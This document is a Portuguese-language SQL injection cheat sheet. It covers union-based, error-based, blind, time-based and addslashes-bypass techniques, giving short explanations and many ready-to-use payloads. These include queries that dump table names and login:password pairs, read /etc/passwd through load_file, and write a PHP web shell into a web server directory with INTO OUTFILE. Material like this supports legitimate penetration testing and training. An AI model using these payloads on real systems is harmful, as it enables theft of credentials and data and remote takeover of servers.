# SQL Injection
Injeção de SQL é uma vulnerabilidade de segurança comum em aplicações web que interagem com bancos de dados. Nesse tipo de ataque, um invasor insere intencionalmente instruções SQL maliciosas nos campos de entrada ou parâmetros de URL de um formulário web, explorando falhas na validação ou sanitização de dados. Quando essas instruções são executadas pelo banco de dados, elas podem permitir que o invasor manipule o comportamento do sistema, como acessar, modificar ou excluir dados, ou até mesmo obter controle total sobre o servidor

## Information Schema
Através do Information Schema é possível obter a tabela com usuários e senhas do sistema e obter as informações nela contidas

Exemplo: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23

Exemplo: ' union select 1,2,concat(login,':',senha),4,5 from table %23

## Error Based
Error Based, como o nome indica, baseia-se no erro que retorna ao tentar realizar uma consulta no banco de dados em algum campo. Com ele, você pode injetar código SQL para descobrir informações sobre a tabela e o banco de dados

Exemplo: ' union select 1,2,3... %23

Exemplo: ' order by 1 or 2 or 3...'

Exemplo: union select 1, column_name, load_file(”/etc/passwd”), 4, 5 from information_schema.columns where table_schema=”database” and table_name=”users” %23

## Blind
Quando não há indícios de que há uma injeção de SQL, alguns testes podem ser usados para verificar a lógica AND e OR do programa

Exemplo: ' and true#
Exemplo: ' or 1=1 union select 1,2#

### Blind Post
Para descobrir informações confidenciais do servidor através da lógica, é possível utilizar a função ascii para descobrir o nome do banco de dados em que a aplicação está localizada, por isso é muito comum utilizar o Burp Suite no modo Repeater para fazer requisições


Example: ' or length(database()) = 7 #

Exemplo: ' or ascii(substring(database(),1,1)) = ascii number for letter # 

Exemplo: ' or database() = char(115,116,114,105,110,103) # 

Exemplo: ' or ascii(substring(select loing from column name limit 0,1),1,1)) = ascii number for letter #

Exemplo: ' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="dbmrtur"%23

## Time Based
O Time Based usa a função sleep() para verificar se há uma vulnerabilidade de injeção de SQL, observando se a página demora muito para responder após o envio de um sleep() em uma solicitação ao banco de dados. Se possível, você pode usar if para verificar informações sobre o banco de dados, tabelas e outras informações, como em outras vulnerabilidades

Exemplo: ' or sleep(5)#

Exemplo: ' or if (length(database()) = 5, sleep(5), 0)#

Exemplo: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)#

Exemplo: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#

## SQLi to RCE
Com a injeção de comando SQL, você pode gravar dados no servidor com o comando INTO OUTFILE e o caminho do diretório que deseja salvar

Exemplo: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/html/website/file.txt” %23

Exemplo: ‘ union all select 1,2,3,4, “`<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23

## Bypass addslashes
Em alguns casos, devido à forma como foi programado para ser consultado no banco de dados, algumas barras invertidas serão adicionadas à consulta, impossibilitando a realização de consultas com aspas simples, gerando um erro. No entanto, uma das maneiras de contornar esse mecanismo é passar valores de string em decimais separados por vírgulas com a função char()

Exemplo: echo -n “string” | od -An -tdC

Exemplo:-1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(115,116,114,105,110,103)

Site: [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)
